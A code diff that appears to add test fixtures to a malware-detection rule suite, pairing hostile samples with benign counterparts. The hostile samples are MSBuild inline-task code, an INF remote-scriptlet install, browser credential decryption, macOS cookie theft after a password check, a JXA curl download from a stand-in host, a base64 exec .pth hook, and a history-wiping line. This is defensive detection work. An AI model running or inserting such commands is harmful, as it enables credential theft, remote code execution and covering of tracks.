@@ -729,6 +729,41 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b"unset HISTFILE; history -c; rm -f ~/.bash_history\n",
             b"history | tail -20\n",
         ),
+        (
+            "win_msbuild_inline_task",
+            b'<UsingTask TaskName="T" TaskFactory="CodeTaskFactory"><Task><Code Type="Class">'
+            b"Marshal.Copy(b, 0, p, n);</Code></Task></UsingTask>\n",
+            b'<UsingTask TaskName="T" TaskFactory="CodeTaskFactory"><Task><Code Type="Class">'
+            b'Process.Start("git", "describe");</Code></Task></UsingTask>\n',
+        ),
+        (
+            "win_inf_scriptlet_install",
+            b"[version]\r\nSignature=$chicago$\r\n[UnRegisterOCXSection]\r\n"
+            b"%11%\\scrobj.dll,NI,https://example.invalid/inert.sct\r\n",
+            b"[version]\r\nSignature=$chicago$\r\n[UnRegisterOCXSection]\r\n%11%\\inert.ocx\r\n",
+        ),
+        (
+            "win_browser_credential_decrypt",
+            b"key = state['os_crypt']['encrypted_key']\n"
+            b"key = CryptUnprotectData(key)\ndb = 'Login Data'\n",
+            b"Copy 'Login Data' and 'Local State' to the backup folder.\n",
+        ),
+        (
+            "macos_stealer_password_check",
+            b'dscl . authonly "$u" "$p" && cp ~/Library/Cookies/Cookies.binarycookies /tmp/x\n',
+            b'dscl . authonly "$u" "$p" && echo valid\n',
+        ),
+        (
+            "macos_jxa_remote_exec",
+            b"var app = Application.currentApplication();\n"
+            b"app.doShellScript('curl -s https://example.invalid/p -o /tmp/p');\n",
+            b"var app = Application.currentApplication();\napp.doShellScript('ls ~/Desktop');\n",
+        ),
+        (
+            "dev_python_pth_exec",
+            b"import os, base64; exec(base64.b64decode('aW5lcnQ='))\n",
+            b"import _virtualenv\n",
+        ),
     ]
 
 
@@ -816,6 +851,7 @@ def main() -> None:
                 "heuristic_safetensors_header": ("bad.safetensors", "ok.safetensors"),
                 "heuristic_gguf_header": ("bad.gguf", "ok.gguf"),
                 "heuristic_filename_control": ("invoice_\u202efdp.exe", "invoice_pdf.exe"),
+                "dev_python_pth_exec": ("hook.pth", "venv.pth"),
             }
             if rule_id in doc_names:
                 fire_name, miss_name = doc_names[rule_id]
